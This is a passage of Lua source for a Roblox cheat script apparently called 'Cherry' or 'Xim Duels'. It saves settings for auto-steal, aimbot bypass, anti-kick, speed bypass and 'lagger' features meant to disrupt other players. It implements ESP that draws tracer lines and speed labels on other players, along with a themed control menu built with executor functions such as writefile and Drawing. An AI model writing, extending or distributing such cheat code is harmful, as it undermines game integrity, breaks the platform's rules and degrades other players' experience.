        autoSwitchSpeed=M.autoSwitchSpeedEnabled, autoTurnOffSpeed=M.autoTurnOffSpeedEnabled, autoSwitchLaggerSpeed=M.autoSwitchLaggerSpeedEnabled, autoCarryEnemyBase=M.autoCarryEnemyBaseEnabled, autoCarryEnemyBaseRange=M.autoCarryEnemyBaseRange, pingPanelOpen=M.pingPanelOpen==true, killLaggerNivel=M.killLaggerNivel or "low", killLaggerOpen=M.killLaggerOpen~=false, killLaggerKey=M.killLaggerKey or "Delete", killLaggerLowKey=M.killLaggerLowKey or "M", killLaggerLocked=M.killLaggerLocked==true, pingPower=M.pingPower, pingInterval=M.pingInterval, pingKeybindKb=(M.KB.PingLagger and M.KB.PingLagger.kb and M.KB.PingLagger.kb.Name) or M.pingKeybindKb, pingKeybindGp=(M.KB.PingLagger and M.KB.PingLagger.gp and M.KB.PingLagger.gp.Name) or M.pingKeybindGp, pingAutoBrainrot=M.pingAutoBrainrot==true, pingBackground=M.pingBackground or 0, pingLocked=M.pingLocked==true, pingMinimized=M.pingMinimized==true, pingPanelPos=M.pingPanelPos, killLaggerPanelPos=M.killLaggerPanelPos, killLaggerMode=M.killLaggerMode or "LOW", panelBgImageId=tonumber(M.panelBgImageId) or 123407376197646, aadEnabled=M.aadEnabled==true, aadVersion=M.aadVersion or "V2", aadKeybind=M.aadKeybind or "Three", aadPanelOpen=M.aadPanelOpen==true, aadLocked=M.aadLocked==true, aadPanelPos=M.aadPanelPos, bypassPanelOpen=M.bypassPanelOpen==true, bypassAutoBrainrot=M.bypassAutoBrainrot==true, bypassBillboardOn=M.bypassBillboardOn~=false, bypassKeybind=M.bypassKeybind, bypassPower=M.bypassPower, mobileButtonsLocked=M.mobileButtonsLocked==true, mobLayoutVer=M._mobLayoutVer or 2, customFont=M.customFontSelected, showPlayerSpeeds=M.showPlayerSpeeds,
        removeAcc=M.removeAccEnabled,
        playerESPEnabled=M.playerESPEnabled,
        autoStealEnabled=M.Steal.AutoStealEnabled,
        autoRadiusEnabled=M.autoRadiusEnabled,
        antiRagdoll=M.antiRagdollEnabled, hardHitEnabled=M.hardHitEnabled, hardHitRadius=M.hardHitRadius, antiRagdollMode=M.antiRagdollMode, infiniteJump=M.infJumpEnabled,
        medusaCounter=M.medusaCounterEnabled, batCounter=M.batCounterEnabled,
        unwalkEnabled=M.unwalkEnabled==true, antiDieEnabled=M.antiDieEnabled==true, antiLag=true, antiSummerBase=M.antiSummerBaseEnabled, uiLocked=M.uiLocked,
        stretchRez=M.stretchRezEnabled, potatoGraphics=M.potatoGraphicsEnabled==true, autoTPEnabled=M.autoTPEnabled, mirrorTPDownEnabled=M.mirrorTPDownEnabled==true, perfectHitEnabled=M.perfectHitEnabled~=false,
        antiKick=false, fpsBoost=M.fpsBoostEnabled==true, safeMode=M.safeModeEnabled, autoBat=M.autoBatEnabled, vyncSkin=M.vyncSkinEnabled==true,
        semiHoldMin=M.Semi.holdMin, semiHoldMax=M.Semi.holdMax,
        semiEntryDelay=M.Semi.entryDelay,
        semiPrimeRange=M.Semi.primeRange,
        semiRadius=math.min(M.Semi.radius, 10),
        lineESPEnabled=M.lineESPEnabled, highlightESPEnabled=M.highlightESPEnabled,
        speedESPEnabled=M.speedESPEnabled,
        autoResetOnDeath=M.autoResetOnDeath,
        animPack=M.animPack,
        headlessEnabled=false,
        korbloxEnabled=false,
        vynxBlackSkinEnabled=false,
        bypassAimbotEnabled=M.bypassAimbotEnabled,
        tpBatHitMode=M.tpBatHitMode or "Sure",
        animPackEnabled=M.animPackEnabled==true,
        dropBrainrotKey=ks(M.KB.DropBrainrot), autoLeftKey=ks(M.KB.AutoLeft),
        autoRightKey=ks(M.KB.AutoRight), autoBatKey=ks(M.KB.AutoBat),
        laggerToggleKey=ks(M.KB.LaggerToggle), tpFloorKey=ks(M.KB.TPFloor),
        instaResetKey=ks(M.KB.InstaReset), guiHideKey=ks(M.KB.GuiHide),
        speedToggleKey=ks(M.KB.SpeedToggle), bypassAimbotKey=ks(M.KB.BypassAimbot),
        pingLaggerKey=ks(M.KB.PingLagger),
    }
    pcall(function() writefile(CHERRY_CONFIG_NAME, HS:JSONEncode(cfg)) end)
end

M.saveConfig = saveCherryConfig

-- ============================================================
-- CHERRY ESP
-- ============================================================
local RunService2 = game:GetService("RunService")
local cherryESPState = { LineESP=false, SpeedESP=false, HighlightESP=(M.highlightESPEnabled==true) }
local cherryESPObjects = {}
local DrawingAvailable = false
pcall(function() DrawingAvailable = Drawing and type(Drawing.new)=="function" end)

local function cherryRemoveESP(p)
    local r = cherryESPObjects[p]
    if not r then return end
    for _,o in pairs(r) do pcall(function()
        if typeof(o)=="Instance" then o:Destroy()
        elseif o.Remove then o:Remove() end
    end) end
    cherryESPObjects[p]=nil
end

local function cherryGetSpeed(root)
    local v
    pcall(function() v=root.AssemblyLinearVelocity end)
    if not v then pcall(function() v=root.Velocity end) end
    if not v then return 0 end
    return Vector3.new(v.X,0,v.Z).Magnitude
end

local function cherryCreateESP(p)
    if cherryESPObjects[p] then return cherryESPObjects[p] end
    local r={}
    local hl=Instance.new("Highlight")
    hl.FillTransparency=0.55; hl.OutlineTransparency=0
    local _hl = (UI_ACCENT or (M.getThemeAccent and M.getThemeAccent()) or Color3.fromRGB(255, 255, 255))
    hl.FillColor=_hl
    hl.OutlineColor=_hl
    hl.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop
    hl.Enabled=false; hl.Parent=workspace
    r.Highlight=hl
    local bb=Instance.new("BillboardGui")
    bb.Size=UDim2.fromOffset(150,32); bb.StudsOffset=Vector3.new(0,3.25,0)
    bb.AlwaysOnTop=true; bb.Enabled=false; bb.ResetOnSpawn=false
    bb.Parent=player:WaitForChild("PlayerGui")
    local sl=Instance.new("TextLabel",bb)
    sl.Size=UDim2.fromScale(1,1); sl.BackgroundTransparency=1; sl.Text="0.0 spd"
    sl.TextStrokeColor3=Color3.new(0,0,0); sl.TextStrokeTransparency=0
    sl.Font=Enum.Font.GothamBlack; sl.TextSize=18
    sl.TextXAlignment=Enum.TextXAlignment.Center; sl.TextYAlignment=Enum.TextYAlignment.Center
    r.Billboard=bb; r.SpeedText=sl
    if DrawingAvailable then
        local ln=Drawing.new("Line")
        ln.Visible=false; ln.Thickness=2.75; ln.Transparency=1
        r.Line=ln
    end
    cherryESPObjects[p]=r
    return r
end

Players.PlayerRemoving:Connect(function(p) cherryRemoveESP(p) end)

-- Build dark UI colours from a chosen accent (every "black" becomes that colour family)
local function themeDarkFromAccent(accent, amount)
    return M.themeDarkFromAccent(accent, amount)
end

local function isNearBlack(c, threshold)
    if typeof(c) ~= "Color3" then return false end
    threshold = threshold or 0.14
    return c.R <= threshold and c.G <= threshold and c.B <= threshold
end

local function applyAccentFromTheme()
    local name = M.colorScheme or M._savedTheme or CherryConfig.Theme or "Black White"
    if name == "Purple Xim" or name == "Purple Vynx" or name == "Light Purple" then name = "Purple" end
    if name == "Black White" or name == "WHITE" then name = "White" end
    if name == "Red Vynx" then name = "Red" end
    local _upper = {PURPLE="Purple", BLUE="Blue", RED="Red", PINK="Pink", YELLOW="Yellow", GREY="Grey", WHITE="White", FOREST="Forest"}
    if _upper[name] then name = _upper[name] end
    if not CHERRY_THEMES[name] then name = "Black White" end
    CherryConfig.Theme = name
    M.colorScheme = name
    M._savedTheme = name
    local t = CHERRY_THEMES[name] or CHERRY_THEMES["Black White"]

    local accent = t.Accent or Color3.fromRGB(255, 255, 255)
    local dim = t.AccentDim or Color3.fromRGB(160, 160, 160)
    local bg  = t.Bg or Color3.fromRGB(0, 0, 0)
    local row = t.Row or Color3.fromRGB(16, 16, 16)
    local btn = t.Row or Color3.fromRGB(8, 8, 8)
    local gradTop = t.Shell or Color3.fromRGB(20, 20, 22)
    local gradBot = t.Bg or Color3.fromRGB(0, 0, 0)

    CHERRY_ACCENT = accent
    UI_ACCENT = accent
    M.bgImageColor = Color3.fromRGB(255, 255, 255)
    UI_ACCENT_DIM = dim
    UI_BG_DARK = bg
    UI_ROW_BG = row
    UI_BTN_BG = btn
    UI_TOGGLE_OFF = Color3.fromRGB(30, 30, 30)
    UI_TOGGLE_KNOB = Color3.fromRGB(255, 255, 255)
    UI_KNOB_ON = Color3.fromRGB(255, 255, 255)
    UI_TEXT_PRIMARY = Color3.fromRGB(255, 255, 255)
    UI_TEXT_WHITE = Color3.fromRGB(255, 255, 255)
    UI_TEXT_DIM = Color3.fromRGB(160, 160, 160)
    UI_TEXT_SECTION = accent
    UI_CARD_STROKE = Color3.fromRGB(40, 40, 40)
    UI_GRAD_TOP = gradTop
    UI_GRAD_BOT = gradBot
    UI_SHELL = t.Shell or Color3.fromRGB(10, 10, 10)
    UI_SHELL_TRANS = tonumber(t.ShellTrans) or 0
    UI_OVERLAY = t.Overlay or Color3.fromRGB(0, 0, 0)
    UI_STROKE = t.Stroke or accent
    pcall(function() if M.tintCustomBackground then M.tintCustomBackground(M.mainFrame) end end)

    M.Theme = {
        Name = name,
        Accent = accent,
        AccentDim = dim,
        Bg = bg,
        Row = row,
        Shell = UI_SHELL,
        Stroke = UI_STROKE,
    }
    pcall(function()
        if M.applyChromeTheme then M.applyChromeTheme() end
        if M.refreshMobileButtonTheme then M.refreshMobileButtonTheme() end
        if M.refreshVynxBrandColors then M.refreshVynxBrandColors() end
                    if M.recolorLiveAccents then M.recolorLiveAccents() end
        if M.refreshTopBannerTheme then M.refreshTopBannerTheme() end
        -- ping lagger panel removed
        if M.recolorLiveAccents then M.recolorLiveAccents() end
        if M.applyStealBarTheme then M.applyStealBarTheme(UI_ACCENT) end
        if M.updateHeadTheme then M.updateHeadTheme() end
        if M.mobileButtonsEnabled and M.buildMobileButtons then M.buildMobileButtons() end
        if player.Character and M.applyVynxBlackSkin then
            -- re-apply tags with new accent
            pcall(function() M.attachVynxBellyTag(player.Character) end)
            pcall(function() M.attachVynxPantsTag(player.Character) end)
            pcall(function() M.attachVynxHat(player.Character) end)
        end
    end)
end

-- Recolor menu chrome (top bar + tabs sidebar + tab buttons) to current theme
function M.applyChromeTheme()
    -- pure black & white chrome
    local chrome = Color3.fromRGB(0, 0, 0)
    local chromeDeep = Color3.fromRGB(0, 0, 0)
    local chromeBright = Color3.fromRGB(255, 255, 255)
    local tabOn = Color3.fromRGB(0, 0, 0)
    local tabOff = Color3.fromRGB(10, 10, 10)
    local strokeCol = Color3.fromRGB(255, 255, 255)

    local hdr = M.headerPanel
    if hdr and hdr.Parent then
        hdr.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        hdr.BackgroundTransparency = 0
        -- close: white bg + black "-"
        local cb = hdr:FindFirstChild("CloseBtn")
        if cb then
            cb.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            cb.BackgroundTransparency = 0
            cb.BorderSizePixel = 0
            cb.Text = "-"
            cb.TextColor3 = Color3.fromRGB(0, 0, 0)
            cb.TextTransparency = 0
            cb.Font = Enum.Font.GothamBlack
            cb.TextSize = 20
            cb.AutoButtonColor = false
            pcall(function() cb:SetAttribute("NoTheme", true) end)
        end
        local fill = hdr:FindFirstChild("HeaderFill") or nil
        for _, c in ipairs(hdr:GetChildren()) do
            if c.Name == "HeaderFill" or (c:IsA("Frame") and c.Size.Y.Offset >= 18 and c.Size.X.Scale == 1 and c ~= hdr) then
                if c.Name ~= "HeaderShine" then
                    pcall(function() c.BackgroundColor3 = chrome end)
                end
            end
            if c.Name == "HeaderShine" then
                c.BackgroundColor3 = chromeBright
                c.BackgroundTransparency = 0.5
            end
            if c:IsA("UIGradient") then
                c.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, chromeBright),
                    ColorSequenceKeypoint.new(0.45, chrome),
                    ColorSequenceKeypoint.new(1, chromeDeep),
                })
            end
        end
        local grad = hdr:FindFirstChildOfClass("UIGradient")
        if grad then
            grad.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, chromeBright),
                ColorSequenceKeypoint.new(0.45, chrome),
                ColorSequenceKeypoint.new(1, chromeDeep),
            })
        end
    end
    local side = M.sideBarPanel
    if side and side.Parent then
        side.BackgroundColor3 = chrome
        side.BackgroundTransparency = 0.05
        local ss = side:FindFirstChildOfClass("UIStroke")
        if ss then ss.Color = strokeCol end
        for _, c in ipairs(side:GetChildren()) do
            if c.Name == "SideFill" or (c:IsA("Frame") and c.Size.X.Offset == 16 and c.Size.Y.Scale == 1) then
                c.BackgroundColor3 = chromeDeep
            end
        end
    end
    if M.tabButtonRefs then
        local cur = M._currentTabName
        for name, btn in pairs(M.tabButtonRefs) do
            if btn and btn.Parent then
                local on = (name == cur)
                -- keep EvadeDuels selected style (light + left bar + border)
                btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                btn.TextColor3 = on and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(110, 110, 110)
                local accent = btn:FindFirstChild("TabAccent")
                if accent then
                    accent.BackgroundTransparency = on and 0 or 1
                    accent.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                end
                local st = btn:FindFirstChildOfClass("UIStroke")
                if st then
                    st.Color = on and Color3.fromRGB(120, 120, 125) or Color3.fromRGB(70, 70, 75)
                    st.Thickness = on and 1.6 or 1.3
                    st.Transparency = on and 0.05 or 0.25
                end
            end
        end
    end
    if M.mainFrame then
        local ms = M.mainFrame:FindFirstChild("MainStroke")
        if ms then ms.Color = strokeCol end
    end
    pcall(function()
        if M.applyStealBarTheme then M.applyStealBarTheme(UI_ACCENT) end
        if M.updateHeadTheme then M.updateHeadTheme() end
        if M.refreshMobileButtonTheme then M.refreshMobileButtonTheme() end
    if M.recolorLiveAccents then M.recolorLiveAccents() end
    end)
end

-- Walk any GUI tree and replace near-black BackgroundColor3 / stroke blacks with theme colours
function M.recolorBlacksToTheme(root)
    if not root then return end
    local bg = UI_BG_DARK or themeDarkFromAccent(UI_ACCENT or Color3.new(1,1,1), 0.10)
    local row = UI_ROW_BG or themeDarkFromAccent(UI_ACCENT or Color3.new(1,1,1), 0.18)
    local btn = UI_BTN_BG or themeDarkFromAccent(UI_ACCENT or Color3.new(1,1,1), 0.22)
    local accent = UI_ACCENT or Color3.new(1,1,1)
    local dim = UI_ACCENT_DIM or accent

    local function recolor(obj)
        if obj:IsA("GuiObject") then
            local n = obj.Name or ""
            if n == "StealBar" or n == "StealBadge" or n == "Fill" or n == "CloseBtn" then return end
            if obj:GetAttribute("NoTheme") then return end
            local ok, col = pcall(function() return obj.BackgroundColor3 end)
            if ok and isNearBlack(col) then
                -- Main frames stay darkest; smaller elements get row/btn tint
                if obj:IsA("Frame") and (obj.Name == "Main" or obj.Name == "MainFrame" or obj.Size.X.Scale >= 0.9) then
                    obj.BackgroundColor3 = bg
                elseif obj:IsA("TextButton") or obj:IsA("ImageButton") then
                    obj.BackgroundColor3 = btn
                else
                    obj.BackgroundColor3 = row
                end
            end
        end
        if obj:IsA("UIStroke") then
            local ok, col = pcall(function() return obj.Color end)
            if ok and isNearBlack(col, 0.25) then
                obj.Color = dim
            end
        end
        if obj:IsA("UIGradient") then
            pcall(function()
                obj.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, UI_GRAD_TOP or gradTop or row),
                    ColorSequenceKeypoint.new(1, UI_GRAD_BOT or bg),
                })
            end)
        end
    end

    recolor(root)
    for _, d in ipairs(root:GetDescendants()) do
        recolor(d)
    end
end

local CHERRY_ACCENT = CHERRY_THEMES[CherryConfig.Theme].Accent

local _espFrameSkip = 0
RunService2.Heartbeat:Connect(function()
    -- only when ESP features on
    if not (cherryESPState.LineESP or cherryESPState.SpeedESP or cherryESPState.HighlightESP) then
        -- hide any existing
        for p,r in pairs(cherryESPObjects) do
            if r.Line then r.Line.Visible=false end
            if r.Highlight then r.Highlight.Enabled=false end
            if r.Billboard then r.Billboard.Enabled=false end
        end
        return
    end
    _espFrameSkip = _espFrameSkip + 1
    if _espFrameSkip < 2 then return end -- every 2nd frame
    _espFrameSkip = 0
    local cam=workspace.CurrentCamera; if not cam then return end
    local lc=player.Character
    local lr=lc and lc:FindFirstChild("HumanoidRootPart")
    local lineStart=Vector2.new(cam.ViewportSize.X*0.5, cam.ViewportSize.Y*0.82)
    if lr then
        local rp,rv=cam:WorldToViewportPoint(lr.Position)
        if rv and rp.Z>0 then lineStart=Vector2.new(rp.X,rp.Y) end
    end
    for _,p in ipairs(Players:GetPlayers()) do
        if p==player then continue end
        local r=cherryCreateESP(p)
        local ch=p.Character
        local hum=ch and ch:FindFirstChildOfClass("Humanoid")
        local root=ch and ch:FindFirstChild("HumanoidRootPart")
        local head=ch and ch:FindFirstChild("Head")
        local alive=ch and hum and root and hum.Health>0
        if not alive then
            if r.Line then r.Line.Visible=false end
            r.Highlight.Enabled=false; r.Billboard.Enabled=false
            r.Highlight.Adornee=nil; r.Billboard.Adornee=nil
            continue
        end
        local liveAccent = (UI_ACCENT or (M.getThemeAccent and M.getThemeAccent()) or Color3.fromRGB(255, 255, 255))
        local showHL = false -- highlight mode removed
        if r.Highlight then r.Highlight.Enabled=false; r.Highlight.Adornee=nil end
        r.Highlight.OutlineColor=liveAccent
        r.Highlight.FillColor=liveAccent
        r.Highlight.FillTransparency=0.55
        r.Highlight.OutlineTransparency=0
        if r.Line then
            local tp,tv=cam:WorldToViewportPoint(root.Position)
            if cherryESPState.LineESP and tv and tp.Z>0 then
                r.Line.From=lineStart; r.Line.To=Vector2.new(tp.X,tp.Y)
                r.Line.Color=liveAccent; r.Line.Thickness=3; r.Line.Visible=true
            else r.Line.Visible=false end
        end
        if cherryESPState.SpeedESP and head then
            r.Billboard.Adornee=head; r.Billboard.Enabled=true
            r.SpeedText.Text=string.format("%.1f spd",cherryGetSpeed(root))
            r.SpeedText.TextColor3=liveAccent
        else r.Billboard.Enabled=false; r.Billboard.Adornee=nil end
    end
end)

function M.trackConn(conn) table.insert(M._persistentConns,conn); return conn end
function M.clearPersistentConns()
    for _,c in ipairs(M._persistentConns) do pcall(function() c:Disconnect() end) end
    M._persistentConns={}
end

function M.makeNumberCallback(tbl,key,min,max)
    return function(v)
        if min and v<min then return end
        if max and v>max then return end
        tbl[key]=v
        if key=="mobileButtonsSize" and M.mobileButtonsEnabled then M.buildMobileButtons() end
        if key=="stealBarSize" then M.buildStatusUI() end
        saveCherryConfig()
    end
end

-- ============================================================
-- Xim DUELS UI (ORIZZONTALE TABS + MENU PIÙ BASSO)
-- ============================================================

local UI_ACCENT       = Color3.fromRGB(255, 255, 255)
local UI_ACCENT_DIM   = Color3.fromRGB(160, 160, 160)
local UI_BG_DARK      = Color3.fromRGB(0, 0, 0)
local UI_ROW_BG       = Color3.fromRGB(0, 0, 0)
local UI_CARD_STROKE  = Color3.fromRGB(50, 50, 50)
local UI_TEXT_WHITE   = Color3.fromRGB(255, 255, 255)
local UI_TEXT_PRIMARY = Color3.fromRGB(255, 255, 255)
local UI_TEXT_DIM     = Color3.fromRGB(170, 170, 170)
local UI_TEXT_SECTION = Color3.fromRGB(255, 255, 255)
local UI_BTN_BG       = Color3.fromRGB(0, 0, 0)
local UI_TOGGLE_OFF   = Color3.fromRGB(0, 0, 0)
local UI_TOGGLE_KNOB  = Color3.fromRGB(255, 255, 255)
local UI_KNOB_ON      = Color3.fromRGB(255, 255, 255)
local UI_GRAD_TOP     = Color3.fromRGB(0, 0, 0)
local UI_GRAD_BOT     = Color3.fromRGB(0, 0, 0)


-- Apply saved colour scheme before any UI is built
pcall(applyAccentFromTheme)

local UI_TWEEN_FAST = TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
local UI_TWEEN_MED  = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)

-- UI STYLE HELPERS
local function uiCardStyle(f)
    f.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
    f.BackgroundTransparency = 0.18
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,11); c.Parent = f
    local s = Instance.new("UIStroke"); s.Thickness = 0.8; s.Color = Color3.fromRGB(255,255,255); s.Transparency = 0.82; s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; s.Parent = f
end

local function uiSmallBtn(p)
    local b = Instance.new("TextButton")
    b.Position = p.Pos or UDim2.new(0,0,0,0); b.Size = p.Size or UDim2.new(0,40,0,23)
    b.BackgroundColor3 = p.Bg or UI_BTN_BG; b.BorderSizePixel = 0
    b.Text = p.Text or ""; b.TextColor3 = p.Col or UI_TEXT_DIM; b.TextSize = p.TS or 11
    b.Font = Enum.Font.GothamBold; b.AutoButtonColor = false; b.ZIndex = p.Z or 1; b.Parent = p.Parent
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,p.CR or 6); c.Parent = b
    return b
end

local function uiAccentBar(parent, on)
    local b = Instance.new("Frame")
    b.Name = "AccentBar"
    b.Position = UDim2.new(0,0,0.5,-11); b.Size = UDim2.new(0,3,0,22)
    b.BackgroundColor3 = on and UI_ACCENT or UI_TEXT_WHITE
    b.BackgroundTransparency = on and 0 or 1; b.BorderSizePixel = 0; b.Parent = parent
    b:SetAttribute("ThemeAccent", true)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,2); c.Parent = b
    return b
end

local function uiAutoCanvas(scroll)
    local lay = scroll:FindFirstChildOfClass("UIListLayout"); if not lay then return end
    local pad = scroll:FindFirstChildOfClass("UIPadding")
    local function upd()
        local padBottom = (pad and pad.PaddingBottom.Offset or 0)
        local padTop = (pad and pad.PaddingTop.Offset or 0)
        local h = lay.AbsoluteContentSize.Y + padBottom + padTop + 24
        scroll.CanvasSize = UDim2.new(0, 0, 0, math.max(h, 1))
    end
    lay:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(upd)
    task.defer(upd)
    task.delay(0.15, upd)
    task.delay(0.5, upd)
end

local function uiSectionHeader(parent, text)
    local r = Instance.new("Frame"); r.Name = "SectionHeader"; r.Size = UDim2.new(1,0,0,22); r.BackgroundTransparency = 1; r.Parent = parent
    local l = Instance.new("TextLabel"); l.Position = UDim2.new(0,8,0,0); l.Size = UDim2.new(1,-12,1,0)
    l.BackgroundTransparency = 1
    l.Text = string.upper(tostring(text or ""))
    l.TextColor3 = Color3.fromRGB(150,150,155)
    l.TextSize = 10; l.Font = Enum.Font.GothamBold; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = r
    return r
end

local function uiInputRow(parent, label, def, hidden)
    -- EvadeDuels speed boxes: dark row + pure black rounded value box
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
    r.BackgroundColor3 = Color3.fromRGB(0, 0, 0); r.BackgroundTransparency = 0; r.BorderSizePixel = 0
    if hidden then r.Visible = false end; r.Parent = parent
    Instance.new("UICorner", r).CornerRadius = UDim.new(0, 10)
    local l = Instance.new("TextLabel"); l.Position = UDim2.new(0,14,0,0); l.Size = UDim2.new(1,-84,1,0)
    l.BackgroundTransparency = 1; l.Text = label; l.TextColor3 = Color3.fromRGB(255,255,255); l.TextSize = 14
    l.Font = Enum.Font.GothamMedium; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = r
    local bx = Instance.new("TextBox"); bx.Name = "NumBox"; bx.Position = UDim2.new(1,-72,0.5,-14); bx.Size = UDim2.new(0,60,0,28)
    bx.BackgroundColor3 = Color3.fromRGB(0, 0, 0); bx.BorderSizePixel = 0; bx.Text = tostring(def); bx.TextColor3 = Color3.fromRGB(255, 255, 255)
    bx.TextSize = 14; bx.Font = Enum.Font.GothamBold; bx.ClearTextOnFocus = false; bx.TextXAlignment = Enum.TextXAlignment.Center; bx.Parent = r
    bx:SetAttribute("NoTheme", true)
    Instance.new("UICorner",bx).CornerRadius = UDim.new(0,9)
    local bst = Instance.new("UIStroke"); bst.Color = Color3.fromRGB(30,30,30); bst.Thickness = 1; bst.Transparency = 0.25; bst.Parent = bx
    return r, bx
end

local function uiToggleRow(parent, label, on, callback)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,46)
    r.BackgroundColor3 = Color3.fromRGB(0, 0, 0); r.BackgroundTransparency = 0; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
    local bar = uiAccentBar(r, on)
    local l = Instance.new("TextLabel"); l.Position = UDim2.new(0,14,0,0); l.Size = UDim2.new(1,-74,1,0)
    l.BackgroundTransparency = 1; l.Text = label; l.TextColor3 = Color3.fromRGB(255,255,255); l.TextSize = 13
    l.Font = Enum.Font.GothamMedium; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = r

    local tb = Instance.new("TextButton"); tb.Name = "ToggleTrack"; tb.Position = UDim2.new(1,-54,0.5,-11); tb.Size = UDim2.new(0,44,0,22)
    tb.BackgroundColor3 = on and (UI_ACCENT or Color3.fromRGB(255,255,255)) or Color3.fromRGB(40, 40, 44); tb.BorderSizePixel = 0; tb.Text = ""; tb.AutoButtonColor = false; tb.Parent = r
    tb:SetAttribute("ThemeToggle", true)
    Instance.new("UICorner",tb).CornerRadius = UDim.new(0,11)
    local knob = Instance.new("Frame"); knob.Size = UDim2.new(0,16,0,16); knob.BorderSizePixel = 0
    knob.Position = on and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8)
    knob.BackgroundColor3 = on and UI_KNOB_ON or UI_TOGGLE_KNOB; knob.Parent = tb
    Instance.new("UICorner",knob)

    local state = on
    local function set(v)
        state = v
        -- live accent so purple stays purple after off/on
        local acc = UI_ACCENT or (M.getThemeAccent and M.getThemeAccent()) or Color3.fromRGB(255, 255, 255)
        local off = Color3.fromRGB(55, 48, 58)
        TweenService:Create(tb, UI_TWEEN_FAST, {BackgroundColor3 = v and acc or off}):Play()
        TweenService:Create(knob, UI_TWEEN_FAST, {Position = v and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8), BackgroundColor3 = v and (UI_KNOB_ON or Color3.fromRGB(255,255,255)) or (UI_TOGGLE_KNOB or Color3.fromRGB(255,255,255))}):Play()
        TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = v and 0 or 1}):Play()
        bar.BackgroundColor3 = acc
        tb.BackgroundColor3 = v and acc or off
    end
    tb.MouseButton1Click:Connect(function()
        set(not state)
        if callback then callback(state) end
        saveCherryConfig()
    end)
    return r, set
end

local function uiActionRow(parent, label, callback)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,42)
    r.BackgroundColor3 = Color3.fromRGB(0, 0, 0); r.BackgroundTransparency = 0; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
    local btn = Instance.new("TextButton"); btn.Size = UDim2.new(1,0,1,0); btn.BackgroundTransparency = 1
    btn.Text = label; btn.TextColor3 = UI_TEXT_PRIMARY; btn.TextSize = 14; btn.Font = Enum.Font.GothamBold; btn.Parent = r
    local bar = uiAccentBar(r, false)

    btn.MouseButton1Click:Connect(function()
        bar.BackgroundColor3 = UI_ACCENT
        TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = 0}):Play()
        task.delay(0.3, function() TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = 1}):Play() end)
        if callback then callback() end
    end)
    return r, btn
end

local function uiNumberRow(parent, label, value, minV, maxV, callback)
    local r, bx = uiInputRow(parent, label, value)
    bx.FocusLost:Connect(function()
        local n = tonumber(bx.Text)
        if n and n >= minV and n <= maxV then
            if callback then callback(n) end
            saveCherryConfig()
        else
            bx.Text = tostring(value)
        end
    end)
    return r, bx
end

local function uiStepNumberRow(parent, label, value, minV, maxV, callback)
    -- Label + [-] [value] [+]  (±1)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
    r.BackgroundColor3 = Color3.fromRGB(0, 0, 0); r.BackgroundTransparency = 0; r.BorderSizePixel = 0; r.Parent = parent
    Instance.new("UICorner", r).CornerRadius = UDim.new(0, 10)
    local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-150,1,0); l.BackgroundTransparency=1
    l.Text=label; l.TextColor3=Color3.fromRGB(255,255,255); l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
    local cur = tonumber(value) or minV or 1
    local function mkBtn(txt, xOff)
        local b = Instance.new("TextButton")
        b.Size = UDim2.new(0, 28, 0, 28)
        b.Position = UDim2.new(1, xOff, 0.5, -14)
        b.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
        b.BorderSizePixel = 0
        b.Text = txt
        b.TextColor3 = Color3.fromRGB(255, 255, 255)
        b.TextSize = 18
        b.Font = Enum.Font.GothamBold
        b.AutoButtonColor = false
        b.Parent = r
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
        local st = Instance.new("UIStroke"); st.Color = Color3.fromRGB(55,55,55); st.Thickness = 1; st.Parent = b
        return b
    end
    local minusBtn = mkBtn("-", -118)
    local vl = Instance.new("TextBox"); vl.Name="NumBox"; vl.Position=UDim2.new(1,-86,0.5,-14); vl.Size=UDim2.new(0,50,0,28)
    vl.BackgroundColor3=Color3.fromRGB(0,0,0); vl.BorderSizePixel=0; vl.Text=tostring(cur)
    vl.TextColor3=Color3.fromRGB(255,255,255); vl.TextSize=14; vl.Font=Enum.Font.GothamBold
    vl.ClearTextOnFocus=false; vl.TextXAlignment=Enum.TextXAlignment.Center; vl.Parent=r
    Instance.new("UICorner",vl).CornerRadius=UDim.new(0,9)
    local vst = Instance.new("UIStroke"); vst.Color=Color3.fromRGB(40,40,40); vst.Thickness=1; vst.Transparency=0.35; vst.Parent=vl
    local plusBtn = mkBtn("+", -32)
    local function setVal(n)
        n = math.clamp(math.floor(tonumber(n) or cur), minV or 1, maxV or 500)
        cur = n
        vl.Text = tostring(cur)
